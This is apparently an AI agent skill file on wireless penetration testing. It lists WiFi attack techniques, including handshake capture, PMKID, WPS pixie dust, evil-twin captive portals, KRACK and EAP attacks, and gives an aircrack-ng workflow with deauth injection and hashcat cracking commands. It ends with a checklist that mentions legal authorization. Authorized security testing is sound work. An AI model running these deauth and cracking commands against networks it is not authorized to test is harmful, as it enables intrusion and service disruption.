---
name: wireless-penetration-testing
description: "Use when testing wireless network security."
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [wireless-pentest, WPA2, WPA3, WPS, WEP, deauth, handshake, aircrack-ng]
    related_skills: [network-sniffing-packet-capture, evasion-techniques-av-bypass, iot-security-framework, osint-reconnaissance-techniques]
---

# Wireless Penetration Testing

Testing wireless network security — from WPA2/WPA3 handshake capture through PMKID attack, WPS pixie dust, rogue AP, and enterprise wireless attacks.

## When to Use

- Assessing WiFi network security
- Testing WPA2/WPA3 handshake capture and cracking
- Auditing WPS configuration
- Rogue access point attacks
- Enterprise wireless (802.1X/EAP) testing

## Wireless Attack Techniques

```python
WIFI_ATTACKS = {
    'handshake_capture': 'Deauth client → capture 4-way handshake → crack PMK offline (hashcat -m 22000)',
    'pmkid': 'Capture PMKID from RSN IE in beacon/probe response — no client needed (hashcat -m 16800)',
    'wps_pixie': 'Brute force WPS PIN via registrar protocol (Reaver, PixieWPS) — offline PIN cracking',
    'rogue_ap': 'Set up evil twin AP with same SSID, capture credentials on fake captive portal',
    'krack': 'KRACK attack — WPA2 key reinstallation, decrypt traffic (patched in 2018, older APs)',
    'eap_attack': 'Hostile portal attack against 802.1X/PEAP — capture MSCHAPv2 challenge/response',
}

# Aircrack-ng workflow
AIRCRACK_WORKFLOW = [
    "airmon-ng start wlan0 — enable monitor mode",
    "airodump-ng wlan0mon — scan for APs and clients",
    "aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon — deauth for handshake",
    "aircrack-ng -w wordlist.txt -b AP_MAC capture.cap — crack handshake",
    "hashcat -m 22000 capture.hccapx wordlist.txt — GPU-crack handshake",
]
```

## Verification Checklist

- [ ] Wireless card supports monitor mode and packet injection
- [ ] Handshake captured (WPA2: 4-way, WPA3: SAE commit/confirm)
- [ ] PMKID captured (PSK networks with RSN IE)
- [ ] WPS tested (locked/locked out after attempts)
- [ ] Handshake cracked (dictionary or brute force)
- [ ] Rogue AP tested (evil twin with captive portal)
- [ ] Enterprise wireless: EAP attacks (PEAP, EAP-TTLS)
- [ ] Legal authorization obtained (testing own networks only)
- [ ] No denial of service on production networks (deauth only when authorized)
